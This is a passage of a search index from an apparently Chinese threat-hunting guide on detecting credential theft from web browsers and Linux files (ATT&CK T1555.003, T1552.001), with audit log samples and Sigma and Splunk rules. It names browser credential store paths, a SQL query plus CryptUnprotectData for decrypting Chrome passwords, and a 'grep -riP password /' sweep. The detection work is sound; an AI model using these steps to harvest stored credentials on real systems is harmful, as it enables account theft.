Chrome\u9ed8\u8ba4\u8d26\u6237\u5bc6\u7801\u51ed\u636e\u5b58\u653e\u4f4d\u7f6e\uff1a %LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data Firefox\u9ed8\u8ba4\u8d26\u6237\u5bc6\u7801\u51ed\u636e\u5b58\u653e\u4f4d\u7f6e\uff1a key3.db\u548clogins.json\u6587\u4ef6\u5747\u4f4d\u4e8e%APPDATA%\\Mozilla\\Firefox\\Profiles\\[random_profile]\u76ee\u5f55\u4e0b Opera\u9ed8\u8ba4\u8d26\u6237\u5bc6\u7801\u51ed\u636e\u5b58\u653e\u4f4d\u7f6e\uff1a C:\\Users\\***\\AppData\\Local\\Opera Software\\Opera Stable\uff08\u5176\u4e2d***\u4e3a\u7cfb\u7edf\u7528\u6237\u540d\uff09 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0\uff0cmsf\u53ef\u8fdb\u884c\u76f8\u5173\u6d4b\u8bd5 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd7 \u4e8b\u4ef6ID\uff1a4633 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u6b63\u5e38\u60c5\u51b5\u4e0b\u4e0d\u4f1a\u6709\u7528\u6237\u9009\u62e9\u5bfc\u51faweb\u6d4f\u89c8\u5668\u7f13\u5b58\u51ed\u636e\u3002\u5f53\u7f51\u5185\u51fa\u73b0\u6b64\u7c7b\u544a\u8b66\u4e8b\u4ef6\uff0c\u503c\u5f97\u5f15\u8d77\u5b89\u5168\u4eba\u5458\u7684\u8b66\u60d5\uff01 \u6b64\u7c7b\u4e8b\u4ef6\u53ea\u67092016\u4ee5\u4e0a\u7248\u672c\u7cfb\u7edf\u624d\u5b58\u5728\u6b64\u7c7b\u4e8b\u4ef6\u3002 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: windows\u7cfb\u7edf web\u6d4f\u89c8\u5668\u83b7\u53d6\u51ed\u8bc1 description: windows server 2016 \u6d4b\u8bd5\u7ed3\u679c references: \u6682\u65e0 tags: T1555-003 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4663 #\u8bd5\u56fe\u8bbf\u95ee\u5bf9\u8c61\u3002 Objectserver: Security #\u5bf9\u8c61>\u5bf9\u8c61\u670d\u52a1\u5668 Objecttype: file #\u5bf9\u8c61>\u5bf9\u8c61\u7c7b\u578b Objectname: - 'C:\\users\\*\\appdata\\roaming\\opera software\\opera stable\\login data' #\u5bf9\u8c61>\u5bf9\u8c61\u540d Opera - 'C:\\Users\\IEUser\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\kushu3sd.default\\key4.db' #Firefox - 'C:\\Users\\IEUser\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\kushu3sd.default\\logins.json' #Firefox - 'C:\\Users\\IEUser\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data' #Chrome Access: ReadData (\u6216listdirectory) #\u8bbf\u95ee\u8bf7\u6c42\u4fe1\u606f>\u8bbf\u95ee condition: selection level: medium \u5efa\u8bae \u89c4\u5219\u672a\u7ecf\u8fc7\u5b9e\u9645\u6d4b\u8bd5\uff0c\u8c28\u614e\u4f7f\u7528 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1555-003 https://attack.mitre.org/techniques/T1555/003/ \u5982\u4f55\u7a83\u53d6\u548c\u89e3\u5bc6\u8fdc\u7a0b\u5b58\u50a8\u5728Chrome\u548cFirefox\u4e2d\u7684\u5bc6\u7801 https://null-byte.wonderhowto.com/how-to/hacking-windows-10-steal-decrypt-passwords-stored-chrome-firefox-remotely-0183600/","title":"T1555-003-windows-\u6765\u81eaweb\u6d4f\u89c8\u5668\u7684\u51ed\u8bc1"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#t1555-003-windows-web","text":"","title":"T1555-003-windows-\u6765\u81eaweb\u6d4f\u89c8\u5668\u7684\u51ed\u8bc1"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#attck","text":"\u5728\u540e\u6e17\u900f\u9636\u6bb5\uff0c\u83b7\u5f97\u6743\u9650\u4e4b\u540e\u653b\u51fb\u8005\u9700\u8981\u6536\u96c6\u76ee\u6807\u7cfb\u7edf\u4e0a\u7684\u76f8\u5173\u4fe1\u606f\uff0c\u6536\u96c6\u7684\u4fe1\u606f\u8d8a\u5168\u9762\u8be6\u7ec6\uff0c\u5bf9\u653b\u51fb\u8005\u7684\u8fdb\u4e00\u6b65\u6e17\u900f\u5e2e\u52a9\u66f4\u5927\u3002\u5bf9\u4e8ewindows\u7cfb\u7edf\u6765\u8bb2\uff0c\u7528\u6237\u6d4f\u89c8\u5668\u5f80\u5f80\u5305\u542b\u7740\u6709\u4ef7\u503c\u7684\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8bfb\u53d6\u7279\u5b9a\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u7684\u6d4f\u89c8\u5668\u6587\u4ef6\u6765\u4eceWeb\u6d4f\u89c8\u5668\u83b7\u53d6\u51ed\u636e\u3002 Web\u6d4f\u89c8\u5668\u901a\u5e38\u4f1a\u4fdd\u5b58\u51ed\u636e\uff0c\u4f8b\u5982\u7f51\u7ad9\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u4ee5\u4fbf\u5c06\u6765\u65e0\u9700\u624b\u52a8\u8f93\u5165\u5b83\u4eec\uff0c\u5b9e\u73b0\u81ea\u52a8\u767b\u5f55\u3002Web\u6d4f\u89c8\u5668\u901a\u5e38\u5c06\u51ed\u636e\u4ee5\u52a0\u5bc6\u683c\u5f0f\u5b58\u50a8\u5728\u51ed\u636e\u5b58\u50a8\u533a\u4e2d\u3002\u4f46\u662f\uff0c\u5b58\u5728\u4eceWeb\u6d4f\u89c8\u5668\u4e2d\u63d0\u53d6\u7eaf\u6587\u672c\u51ed\u636e\u7684\u65b9\u6cd5\u3002 \u4f8b\u5982\uff0c\u5728Windows\u7cfb\u7edf\u4e0a\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bfb\u53d6\u6570\u636e\u5e93\u6587\u4ef6AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\u5e76\u6267\u884cSQL\u67e5\u8be2\u6765\u4eceGoogle Chrome\u83b7\u5f97\u52a0\u5bc6\u7684\u51ed\u636eSELECT action_url, username_value, password_value FROM logins;\u3002\u7136\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u5c06\u52a0\u5bc6\u7684\u51ed\u636e\u4f20\u9012\u7ed9Windows API\u51fd\u6570\u6765\u83b7\u53d6\u7eaf\u6587\u672c\u5bc6\u7801CryptUnprotectData\uff0c\u8be5\u51fd\u6570\u4f7f\u7528\u53d7\u5bb3\u8005\u7684\u7f13\u5b58\u767b\u5f55\u51ed\u636e\u4f5c\u4e3a\u89e3\u5bc6\u5bc6\u94a5\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5bf9\u5e38\u89c1\u7684Web\u6d4f\u89c8\u5668\uff08\u4f8b\u5982FireFox\uff0cChrome\uff0cEdge\u7b49\uff09\u6267\u884c\u4e86\u7c7b\u4f3c\u7684\u7a0b\u5e8f\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5728Web\u6d4f\u89c8\u5668\u8fdb\u7a0b\u5185\u5b58\u4e2d\u641c\u7d22\uff0c\u901a\u5e38\u4e0e\u51ed\u636e\u5339\u914d\u7684\u6a21\u5f0f\u6765\u83b7\u53d6\u51ed\u636e\u3002\u4ece\u7f51\u7edc\u6d4f\u89c8\u5668\u83b7\u53d6\u51ed\u636e\u540e\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u5728\u4e0d\u540c\u7cfb\u7edf\u6216\u5e10\u6237\u4e4b\u95f4\u56de\u6536\u51ed\u636e\uff0c\u4ee5\u6269\u5927\u8bbf\u95ee\u8303\u56f4\u3002\u5728\u4eceWeb\u6d4f\u89c8\u5668\u83b7\u5f97\u7684\u51ed\u636e\u4e0e\u7279\u6743\u5e10\u6237\uff08\u4f8b\u5982\u57df\u7ba1\u7406\u5458\uff09\u91cd\u53e0\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u53ef\u4ee5\u5927\u5927\u7f29\u77ed\u653b\u51fb\u8005\u7684\u653b\u51fb\u65f6\u95f4\u3002 \u4e0d\u540c\u7684\u6d4f\u89c8\u5668\uff0c\u9ed8\u8ba4\u7f13\u5b58\u5b58\u50a8\u7684\u4f4d\u7f6e\u4e0d\u540c\u3002 Chrome\u9ed8\u8ba4\u8d26\u6237\u5bc6\u7801\u51ed\u636e\u5b58\u653e\u4f4d\u7f6e\uff1a %LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data Firefox\u9ed8\u8ba4\u8d26\u6237\u5bc6\u7801\u51ed\u636e\u5b58\u653e\u4f4d\u7f6e\uff1a key3.db\u548clogins.json\u6587\u4ef6\u5747\u4f4d\u4e8e%APPDATA%\\Mozilla\\Firefox\\Profiles\\[random_profile]\u76ee\u5f55\u4e0b Opera\u9ed8\u8ba4\u8d26\u6237\u5bc6\u7801\u51ed\u636e\u5b58\u653e\u4f4d\u7f6e\uff1a C:\\Users\\***\\AppData\\Local\\Opera Software\\Opera Stable\uff08\u5176\u4e2d***\u4e3a\u7cfb\u7edf\u7528\u6237\u540d\uff09","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#_1","text":"\u6682\u65e0\uff0cmsf\u53ef\u8fdb\u884c\u76f8\u5173\u6d4b\u8bd5","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#_4","text":"windows \u5b89\u5168\u65e5\u5fd7 \u4e8b\u4ef6ID\uff1a4633 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u6b63\u5e38\u60c5\u51b5\u4e0b\u4e0d\u4f1a\u6709\u7528\u6237\u9009\u62e9\u5bfc\u51faweb\u6d4f\u89c8\u5668\u7f13\u5b58\u51ed\u636e\u3002\u5f53\u7f51\u5185\u51fa\u73b0\u6b64\u7c7b\u544a\u8b66\u4e8b\u4ef6\uff0c\u503c\u5f97\u5f15\u8d77\u5b89\u5168\u4eba\u5458\u7684\u8b66\u60d5\uff01 \u6b64\u7c7b\u4e8b\u4ef6\u53ea\u67092016\u4ee5\u4e0a\u7248\u672c\u7cfb\u7edf\u624d\u5b58\u5728\u6b64\u7c7b\u4e8b\u4ef6\u3002","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#sigma","text":"title: windows\u7cfb\u7edf web\u6d4f\u89c8\u5668\u83b7\u53d6\u51ed\u8bc1 description: windows server 2016 \u6d4b\u8bd5\u7ed3\u679c references: \u6682\u65e0 tags: T1555-003 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4663 #\u8bd5\u56fe\u8bbf\u95ee\u5bf9\u8c61\u3002 Objectserver: Security #\u5bf9\u8c61>\u5bf9\u8c61\u670d\u52a1\u5668 Objecttype: file #\u5bf9\u8c61>\u5bf9\u8c61\u7c7b\u578b Objectname: - 'C:\\users\\*\\appdata\\roaming\\opera software\\opera stable\\login data' #\u5bf9\u8c61>\u5bf9\u8c61\u540d Opera - 'C:\\Users\\IEUser\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\kushu3sd.default\\key4.db' #Firefox - 'C:\\Users\\IEUser\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\kushu3sd.default\\logins.json' #Firefox - 'C:\\Users\\IEUser\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data' #Chrome Access: ReadData (\u6216listdirectory) #\u8bbf\u95ee\u8bf7\u6c42\u4fe1\u606f>\u8bbf\u95ee condition: selection level: medium","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#_6","text":"\u89c4\u5219\u672a\u7ecf\u8fc7\u5b9e\u9645\u6d4b\u8bd5\uff0c\u8c28\u614e\u4f7f\u7528","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#_7","text":"MITRE-ATT&CK-T1555-003 https://attack.mitre.org/techniques/T1555/003/ \u5982\u4f55\u7a83\u53d6\u548c\u89e3\u5bc6\u8fdc\u7a0b\u5b58\u50a8\u5728Chrome\u548cFirefox\u4e2d\u7684\u5bc6\u7801 https://null-byte.wonderhowto.com/how-to/hacking-windows-10-steal-decrypt-passwords-stored-chrome-firefox-remotely-0183600/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/","text":"T1081-linux-\u6587\u4ef6\u4e2d\u7684\u51ed\u636e \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u548c\u8fdc\u7a0b\u6587\u4ef6\u5171\u4eab\u4e2d\u641c\u7d22\u5305\u542b\u4e0d\u5b89\u5168\u5b58\u50a8\u7684\u51ed\u636e\u7684\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u53ef\u4ee5\u662f\u7528\u6237\u521b\u5efa\u7684\u7528\u4e8e\u5b58\u50a8\u81ea\u5df1\u7684\u51ed\u636e\u7684\u6587\u4ef6\uff0c\u4e00\u7ec4\u4e2a\u4eba\u7684\u5171\u4eab\u51ed\u636e\u5b58\u50a8\uff0c\u5305\u542b\u7cfb\u7edf\u6216\u670d\u52a1\u5bc6\u7801\u7684\u914d\u7f6e\u6587\u4ef6\u6216\u5305\u542b\u5d4c\u5165\u5f0f\u5bc6\u7801\u7684\u6e90\u4ee3\u7801/\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 \u53ef\u4ee5\u901a\u8fc7OS Credential Dumping\u4ece\u5907\u4efd\u6216\u4fdd\u5b58\u7684\u865a\u62df\u673a\u4e2d\u63d0\u53d6\u5bc6\u7801\u3002\u4e5f\u53ef\u4ee5\u4eceWindows\u57df\u63a7\u5236\u5668\u4e0a\u5b58\u50a8\u7684\u7ec4\u7b56\u7565\u9996\u9009\u9879\u4e2d\u83b7\u53d6\u5bc6\u7801\u3002 \u5728\u4e91\u73af\u5883\u4e2d\uff0c\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u51ed\u636e\u901a\u5e38\u5b58\u50a8\u5728\u672c\u5730\u914d\u7f6e\u548c\u51ed\u636e\u6587\u4ef6\u4e2d\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5c06\u8fd9\u4e9b\u6587\u4ef6\u590d\u5236\u5e76\u5728\u53e6\u4e00\u53f0\u673a\u5668\u4e0a\u91cd\u590d\u4f7f\u7528\uff0c\u6216\u8005\u53ef\u4ee5\u8bfb\u53d6\u5185\u5bb9\uff0c\u7136\u540e\u5c06\u5176\u7528\u4e8e\u8eab\u4efd\u9a8c\u8bc1\uff0c\u800c\u65e0\u9700\u590d\u5236\u4efb\u4f55\u6587\u4ef6\u3002 \u6d4b\u8bd5\u6848\u4f8b grep -riP password #{\u60f3\u8981\u67e5\u627e\u7684\u6587\u4ef6\u8def\u5f84} grep -riP password / \u68c0\u6d4b\u65e5\u5fd7 linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09 bash\u5386\u53f2\u8bb0\u5f55 \u6d4b\u8bd5\u590d\u73b0 icbc@icbc:/$ grep -riP passwd /etc/passwd \u6d4b\u8bd5\u7559\u75d5 audit\u65e5\u5fd7 icbc@icbc:/$ gedit /var/log/audit/audit.log type=SYSCALL msg=audit(1563526266.080:744): arch=c000003e syscall=59 success=yes exit=0 a0=55f3435691b0 a1=55f3434345d0 a2=55f343573580 a3=8 items=2 ppid=2031 pid=4855 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=3 comm=\"grep\" exe=\"/usr/bin/grep\" key=\"auditcmd\" type=EXECVE msg=audit(1563526266.080:744): argc=5 a0=\"grep\" a1=\"--color=auto\" a2=\"-riP\" a3=\"passwd\" a4=\"/etc/passwd\" type=CWD msg=audit(1563526266.080:744): cwd=\"/\" type=PATH msg=audit(1563526266.080:744): item=0 name=\"/usr/bin/grep\" inode=2228723 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u8fd9\u91cc\u53ea\u63d0\u53d6\u51fa\u4e86\u5f02\u5e38\u65e5\u5fd7\uff0c\u6545\u7701\u7565\u4e86\u5f88\u591a\u65e5\u5fd7\u7ec6\u8282\u3002 bash\u5386\u53f2\u8bb0\u5f55 icbc@icbc:/$ history 1 grep -riP passwd /etc/passwd \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u89c4\u5219 audit\u65e5\u5fd7 index=linux sourcetype=linux_audit type=execve a0=grep a0=\"grep\" a1=\"--color=auto\" a2=\"-riP\" a3=\"passwd\" splunk\u89c4\u5219 bash \u5386\u53f2\u8bb0\u5f55 index=linux sourcetype=\"bash_history\" grep password | table host,user_name,bash_command sigma\u89c4\u5219 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u81ea\u884c\u914d\u7f6eAudit\u5ba1\u6838\u89c4\u5219 title: \u653b\u51fb\u8005\u67e5\u770blinux\u4e0b\u53ef\u80fd\u5305\u542b\u7528\u6237\u8d26\u6237\u5bc6\u7801\u7684\u6587\u4ef6 description: Ubuntu18.04 references: https://github.com/12306Bro/Threathunting/blob/master/T1081-linux-\u6587\u4ef6\u4e2d\u7684\u51ed\u8bc1.md tags: T1552-001 status: experimental author: 12306Bro logsource: product: linux service: audit\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6eaudit\u89c4\u5219\uff09 detection: keywords: \u200b - comm=\"grep\" exe=\"/bin/grep\" key=\"audit_110\" condition: keywords logsource: product: linux service: history detection: selection: keywords: \u200b - grep * passwd condition: keywords level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1552-001 https://attack.mitre.org/techniques/T1552/001","title":"T1081-linux-\u6587\u4ef6\u4e2d\u7684\u51ed\u636e"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#t1081-linux-","text":"","title":"T1081-linux-\u6587\u4ef6\u4e2d\u7684\u51ed\u636e"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u548c\u8fdc\u7a0b\u6587\u4ef6\u5171\u4eab\u4e2d\u641c\u7d22\u5305\u542b\u4e0d\u5b89\u5168\u5b58\u50a8\u7684\u51ed\u636e\u7684\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u53ef\u4ee5\u662f\u7528\u6237\u521b\u5efa\u7684\u7528\u4e8e\u5b58\u50a8\u81ea\u5df1\u7684\u51ed\u636e\u7684\u6587\u4ef6\uff0c\u4e00\u7ec4\u4e2a\u4eba\u7684\u5171\u4eab\u51ed\u636e\u5b58\u50a8\uff0c\u5305\u542b\u7cfb\u7edf\u6216\u670d\u52a1\u5bc6\u7801\u7684\u914d\u7f6e\u6587\u4ef6\u6216\u5305\u542b\u5d4c\u5165\u5f0f\u5bc6\u7801\u7684\u6e90\u4ee3\u7801/\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 \u53ef\u4ee5\u901a\u8fc7OS Credential Dumping\u4ece\u5907\u4efd\u6216\u4fdd\u5b58\u7684\u865a\u62df\u673a\u4e2d\u63d0\u53d6\u5bc6\u7801\u3002\u4e5f\u53ef\u4ee5\u4eceWindows\u57df\u63a7\u5236\u5668\u4e0a\u5b58\u50a8\u7684\u7ec4\u7b56\u7565\u9996\u9009\u9879\u4e2d\u83b7\u53d6\u5bc6\u7801\u3002 \u5728\u4e91\u73af\u5883\u4e2d\uff0c\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u51ed\u636e\u901a\u5e38\u5b58\u50a8\u5728\u672c\u5730\u914d\u7f6e\u548c\u51ed\u636e\u6587\u4ef6\u4e2d\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5c06\u8fd9\u4e9b\u6587\u4ef6\u590d\u5236\u5e76\u5728\u53e6\u4e00\u53f0\u673a\u5668\u4e0a\u91cd\u590d\u4f7f\u7528\uff0c\u6216\u8005\u53ef\u4ee5\u8bfb\u53d6\u5185\u5bb9\uff0c\u7136\u540e\u5c06\u5176\u7528\u4e8e\u8eab\u4efd\u9a8c\u8bc1\uff0c\u800c\u65e0\u9700\u590d\u5236\u4efb\u4f55\u6587\u4ef6\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#_1","text":"grep -riP password #{\u60f3\u8981\u67e5\u627e\u7684\u6587\u4ef6\u8def\u5f84} grep -riP password /","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#_2","text":"linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09 bash\u5386\u53f2\u8bb0\u5f55","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#_3","text":"icbc@icbc:/$ grep -riP passwd /etc/passwd","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#_4","text":"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#audit","text":"icbc@icbc:/$ gedit /var/log/audit/audit.log type=SYSCALL msg=audit(1563526266.080:744): arch=c000003e syscall=59 success=yes exit=0 a0=55f3435691b0 a1=55f3434345d0 a2=55f343573580 a3=8 items=2 ppid=2031 pid=4855 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=3 comm=\"grep\" exe=\"/usr/bin/grep\" key=\"auditcmd\" type=EXECVE msg=audit(1563526266.080:744): argc=5 a0=\"grep\" a1=\"--color=auto\" a2=\"-riP\" a3=\"passwd\" a4=\"/etc/passwd\" type=CWD msg=audit(1563526266.080:744): cwd=\"/\" type=PATH msg=audit(1563526266.080:744): item=0 name=\"/usr/bin/grep\" inode=2228723 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u8fd9\u91cc\u53ea\u63d0\u53d6\u51fa\u4e86\u5f02\u5e38\u65e5\u5fd7\uff0c\u6545\u7701\u7565\u4e86\u5f88\u591a\u65e5\u5fd7\u7ec6\u8282\u3002","title":"audit\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#bash","text":"icbc@icbc:/$ history 1 grep -riP passwd /etc/passwd","title":"bash\u5386\u53f2\u8bb0\u5f55"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#splunk","text":"audit\u65e5\u5fd7 index=linux sourcetype=linux_audit type=execve a0=grep a0=\"grep\" a1=\"--color=auto\" a2=\"-riP\" a3=\"passwd\"","title":"splunk\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#splunk_1","text":"bash \u5386\u53f2\u8bb0\u5f55 index=linux sourcetype=\"bash_history\" grep password | table host,user_name,bash_command","title":"splunk\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#sigma","text":"\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u81ea\u884c\u914d\u7f6eAudit\u5ba1\u6838\u89c4\u5219 title: \u653b\u51fb\u8005\u67e5\u770blinux\u4e0b\u53ef\u80fd\u5305\u542b\u7528\u6237\u8d26\u6237\u5bc6\u7801\u7684\u6587\u4ef6 description: Ubuntu18.04 references: https://github.com/12306Bro/Threathunting/blob/master/T1081-linux-\u6587\u4ef6\u4e2d\u7684\u51ed\u8bc1.md tags: T1552-001 status: experimental author: 12306Bro logsource: product: linux service: audit\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6eaudit\u89c4\u5219\uff09 detection: keywords: \u200b - 